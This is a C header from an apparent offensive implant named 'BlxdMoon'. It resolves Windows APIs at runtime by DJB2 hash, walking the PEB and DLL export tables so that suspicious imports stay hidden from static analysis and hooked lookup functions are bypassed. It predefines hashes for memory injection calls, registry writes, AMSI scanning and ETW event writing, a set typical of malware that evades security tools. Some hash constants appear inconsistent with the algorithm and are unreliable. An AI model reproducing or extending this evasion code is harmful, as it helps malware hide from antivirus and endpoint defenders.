/**
 * api_resolve.h - Dynamic API Resolution for BlxdMoon
 *
 * MITRE ATT&CK: T1027.007 - Dynamic API Resolution
 *
 * Purpose: Resolve Windows APIs at runtime using hashes instead of
 * importing them statically. This hides suspicious API combinations
 * from static analysis.
 */

#ifndef API_RESOLVE_H
#define API_RESOLVE_H

#include <windows.h>
#include <winternl.h>
#include <ctype.h>

// ============================================================
// MinGW Compatibility - Define internal structures
// ============================================================
// MinGW's winternl.h doesn't fully define these structures

#ifdef __MINGW32__

typedef struct _UNICODE_STRING_FULL {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_FULL, *PUNICODE_STRING_FULL;

typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING_FULL FullDllName;
    UNICODE_STRING_FULL BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY_FULL, *PLDR_DATA_TABLE_ENTRY_FULL;

#define BLXD_LDR_ENTRY LDR_DATA_TABLE_ENTRY_FULL
#define BLXD_PLDR_ENTRY PLDR_DATA_TABLE_ENTRY_FULL

#else

#define BLXD_LDR_ENTRY LDR_DATA_TABLE_ENTRY
#define BLXD_PLDR_ENTRY PLDR_DATA_TABLE_ENTRY

#endif // __MINGW32__

// ============================================================
// DJB2 Hash Functions
// ============================================================

/**
 * DJB2 hash algorithm - fast with low collision rate
 * Use for function names (case-sensitive)
 */
__forceinline DWORD djb2_hash(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

/**
 * Case-insensitive variant for module names
 */
__forceinline DWORD djb2_hash_i(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + tolower(c);
    }
    return hash;
}

// ============================================================
// Pre-computed API Hashes
// ============================================================

// Module hashes (lowercase)
#define HASH_KERNEL32_DLL       0x6A4ABC5B
#define HASH_NTDLL_DLL          0x3CFA685D
#define HASH_ADVAPI32_DLL       0x54C1E56B
#define HASH_USER32_DLL         0x63C84283
#define HASH_AMSI_DLL           0x61247BD6

// kernel32.dll functions
#define HASH_LOADLIBRARYA       0xEC0E4E8E
#define HASH_GETPROCADDRESS     0x7C0DFCAA
#define HASH_VIRTUALALLOC       0x91AFCA54
#define HASH_VIRTUALPROTECT     0x7946C61B
#define HASH_VIRTUALFREE        0x030633AC
#define HASH_CREATEFILEA        0x7C0017A5
#define HASH_WRITEFILE          0xF1D207D0
#define HASH_READFILE           0xA1D7B537
#define HASH_CLOSEHANDLE        0x0FFD97FB
#define HASH_GETMODULEHANDLEA   0xB1866570
#define HASH_GETCOMPUTERNAMEA   0xAA5DAA1D
#define HASH_SLEEP              0xE07CD7E

// ntdll.dll functions
#define HASH_NTALLOCATEVIRTUALMEMORY    0xF783B8EC
#define HASH_NTPROTECTVIRTUALMEMORY     0x50E92888
#define HASH_NTWRITEVIRTUALMEMORY       0xC3170192
#define HASH_NTCREATETHREADEX           0x64DC7453
#define HASH_NTCLOSE                    0x40D6E69D
#define HASH_ETWEVENTWRITE              0xA35D0E65

// advapi32.dll functions
#define HASH_REGOPENKEYEXA      0x9B9C1A3E
#define HASH_REGSETVALUEEXA     0x89F33A50
#define HASH_REGCLOSEKEY        0x7C2D89C0
#define HASH_REGQUERYVALUEEXA   0x21C70C5E

// user32.dll functions
#define HASH_MESSAGEBOXW        0xBC4DA2A8
#define HASH_MESSAGEBOXA        0xBC4DA2A7
#define HASH_SHOWWINDOW         0xD5C91B1E
#define HASH_GETCURSORPOS       0x4561AB1B

// amsi.dll functions
#define HASH_AMSISCANBUFFER     0xA5EF2E1C
#define HASH_AMSIOPENSESSION    0x5C9B3E1A

// ============================================================
// PEB Walking - Module Resolution by Hash
// ============================================================

/**
 * Get module handle by walking the PEB loader data
 * Avoids calling GetModuleHandle which may be hooked
 *
 * @param hash - DJB2 hash of module name (lowercase)
 * @return Module handle or NULL
 */
static inline HMODULE GetModuleByHash(DWORD hash) {
    // Read PEB from TEB
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

    if (!pPeb || !pPeb->Ldr) return NULL;

    // Walk InMemoryOrderModuleList
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    while (pEntry != pHead) {
        BLXD_PLDR_ENTRY pDataEntry = CONTAINING_RECORD(
            pEntry,
            BLXD_LDR_ENTRY,
            InMemoryOrderLinks
        );

        if (pDataEntry->BaseDllName.Buffer != NULL) {
            // Convert wide string to ANSI for hashing
            char moduleName[256] = {0};
            int len = pDataEntry->BaseDllName.Length / sizeof(WCHAR);

            for (int i = 0; i < len && i < 255; i++) {
                moduleName[i] = (char)pDataEntry->BaseDllName.Buffer[i];
            }

            // Compare hash (case-insensitive)
            if (djb2_hash_i(moduleName) == hash) {
                return (HMODULE)pDataEntry->DllBase;
            }
        }

        pEntry = pEntry->Flink;
    }

    return NULL;
}

// ============================================================
// Export Table Walking - Function Resolution by Hash
// ============================================================

/**
 * Get function address by walking the export table
 * Avoids calling GetProcAddress which may be hooked
 *
 * @param hModule - Module handle
 * @param hash    - DJB2 hash of function name (case-sensitive)
 * @return Function address or NULL
 */
static inline FARPROC GetFunctionByHash(HMODULE hModule, DWORD hash) {
    if (!hModule) return NULL;

    // Parse PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)hModule + pDosHeader->e_lfanew
    );
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    // Get export directory
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[
        IMAGE_DIRECTORY_ENTRY_EXPORT
    ].VirtualAddress;

    if (exportDirRVA == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)hModule + exportDirRVA
    );

    // Get export tables
    PDWORD pAddressOfNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    PDWORD pAddressOfFunctions = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfFunctions);
    PWORD pAddressOfOrdinals = (PWORD)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);

    // Search for function by hash
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char *funcName = (char*)hModule + pAddressOfNames[i];

        if (djb2_hash(funcName) == hash) {
            WORD ordinal = pAddressOfOrdinals[i];
            DWORD funcRVA = pAddressOfFunctions[ordinal];

            // Check for forwarded export
            DWORD exportDirSize = pNtHeaders->OptionalHeader.DataDirectory[
                IMAGE_DIRECTORY_ENTRY_EXPORT
            ].Size;

            if (funcRVA >= exportDirRVA && funcRVA < exportDirRVA + exportDirSize) {
                // Forwarded export - would need to resolve
                // For simplicity, skip forwarded exports
                return NULL;
            }

            return (FARPROC)((BYTE*)hModule + funcRVA);
        }
    }

    return NULL;
}

// ============================================================
// Convenience Macros
// ============================================================

/**
 * Resolve API by module and function hash
 */
#define RESOLVE_API(module_hash, func_hash, func_type, func_ptr) \
    func_type func_ptr = (func_type)GetFunctionByHash( \
        GetModuleByHash(module_hash), \
        func_hash \
    )

/**
 * Resolve API from already-resolved module
 */
#define RESOLVE_API_FROM_MODULE(hModule, func_hash, func_type, func_ptr) \
    func_type func_ptr = (func_type)GetFunctionByHash(hModule, func_hash)

// ============================================================
// Function Pointer Typedefs
// ============================================================

// kernel32.dll
typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL (WINAPI *fn_VirtualFree)(LPVOID, SIZE_T, DWORD);
typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *fn_CloseHandle)(HANDLE);
typedef HMODULE (WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef void (WINAPI *fn_Sleep)(DWORD);

// ntdll.dll
typedef NTSTATUS (NTAPI *fn_NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fn_NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *fn_NtClose)(HANDLE);

// advapi32.dll
typedef LONG (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI *fn_RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG (WINAPI *fn_RegCloseKey)(HKEY);
typedef LONG (WINAPI *fn_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);

// user32.dll
typedef int (WINAPI *fn_MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
typedef int (WINAPI *fn_MessageBoxW)(HWND, LPCWSTR, LPCWSTR, UINT);
typedef BOOL (WINAPI *fn_ShowWindow)(HWND, int);
typedef BOOL (WINAPI *fn_GetCursorPos)(LPPOINT);

#endif // API_RESOLVE_H
